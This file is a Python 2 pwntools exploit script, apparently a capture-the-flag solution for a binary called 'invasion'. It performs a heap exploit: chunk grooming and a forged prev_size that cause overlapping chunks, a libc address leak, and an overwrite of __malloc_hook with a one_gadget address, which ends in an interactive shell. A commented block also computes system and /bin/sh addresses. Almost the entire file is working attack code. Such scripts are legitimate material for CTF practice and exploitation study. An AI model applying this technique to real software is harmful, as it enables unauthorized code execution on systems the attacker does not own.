#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './invasion'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla("today.\n", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, name):
    sla("name?\n", size)
    sa("name?\n", name)

@choice(idx=2)
def free(idx):
    sla("mother?\n", idx)

@choice(idx=3)
def edit(idx, data):
    sla("rename?\n", idx)
    sa("to?\n", data)

def start():
    sla("ka?\n", "3")

def get_libc(idx):
    sla("today.\n", '3')
    sla("rename?\n", idx)
    ru("rename ")
    data = uu64(r(6))
    sla("to?\n", '')
    return data

def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    start()
    for i in range(4):
        new(0x28, str(i)*0x8)
    new(0xf0, "4") 
    free(0)
    new(0xf0, "5")
    new(0xf0, "6") #change pointer
    free(1)
    new(0xf0,"7")

    new(0x48,"8") #avoid consolidate top chunk
    free(6)
    new(0xf8, "9"*0xf0 + p64(0x100+0x20+0x100+0x100))
    free(4)
    free(7)
    new(0xf0, "10") 
    #edit(5,'')
    libc.address = get_libc(5) - 0x3c4b78
    lg("libc", libc.address)
    new(0xf0, '11')
    free(2)
    new(0x18, p64(libc.symbols['__malloc_hook']) + p64(0)) #12
    edit(9, p64(libc.address + 0xf02a4))

    ga()
    new(0x1f000, "13")
    sl("1")
    sl(0x1f000)


    #free(10)
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,)

